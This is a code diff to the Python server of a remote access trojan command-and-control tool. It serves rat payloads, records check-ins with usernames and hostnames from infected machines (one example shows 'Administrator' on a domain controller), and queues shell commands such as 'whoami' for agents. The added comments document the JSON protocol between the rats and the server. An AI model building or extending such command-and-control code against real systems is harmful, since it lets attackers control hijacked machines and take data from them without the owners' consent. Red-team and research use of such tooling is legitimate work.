@@ -468,8 +468,20 @@ def serve_server(port=8080):
             ratType = path.split(".")[1]
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
 
+        #
+        # Rats and the server communicate with each other using JSON strings
+        # To support peer-to-peer rats, each rat and the server send 1 or more "packages" to and from each other.
+        # Packages are formatted like so: { "p":[ {package1}, {package2} ] }
+        #
+        # Data sent from a rat (Rat --> Server) may look like the following. This data contains 2 packages
+        # { "p":[ {"type": "hta", "id": 3082961485, "un": "kclark", "hn": "WS01"}, {"type": "js", "id": 123345667, "un": "Administrator", "hn": "DC"} ] }
+        #
+        # Data sent back TO a rat (Server --> Rat) looks similar, but the packages will contain different values. Example below. This data also contains 2 packages.
+        # { "p":[ {"id":"123445677","cmnd": "whoami"}, {"id":"3082961485","cmnd": "hostname"} ] }
+        #
+
         # We are dealing with normal rat comms
-        # Parse POST parameters
+        # Parse POST parameters into JSON string then into python dict
         post_json = request.get_json(force=True)
         post_dict = dict(post_json)
         try:
@@ -483,6 +495,9 @@ def serve_server(port=8080):
             pretty_print("\n[!] Failed to grab id, type, username, or hostname param from POST request")
             return(default_page())
 
+        if(verbose):
+            pretty_print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
+
         # Update checkin time for an agent every checkin
         checkin = datetime.now().strftime("%H:%M:%S")
         rats[ratID] = checkin
@@ -490,8 +505,6 @@ def serve_server(port=8080):
         usernames[ratID] = username
         hostnames[ratID] = hostname
         ip_addrs[ratID] = ip_addr
-        if(verbose):
-            pretty_print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
 
         # If there is no current command for a rat, create a blank one
         if(ratID not in commands):
